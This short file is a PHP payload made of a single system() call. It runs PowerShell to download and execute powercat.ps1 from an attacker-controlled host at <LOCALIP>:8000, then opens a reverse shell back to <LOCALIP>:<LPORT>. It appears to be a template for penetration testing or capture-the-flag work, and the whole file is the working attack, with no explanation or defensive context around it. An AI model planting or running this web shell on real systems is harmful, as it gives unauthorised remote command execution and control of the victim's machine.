<?php
system('powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString(\'http://<LOCALIP>:8000/powercat.ps1\'); powercat -c <LOCALIP> -p <LPORT> -e powershell"'); 
?>
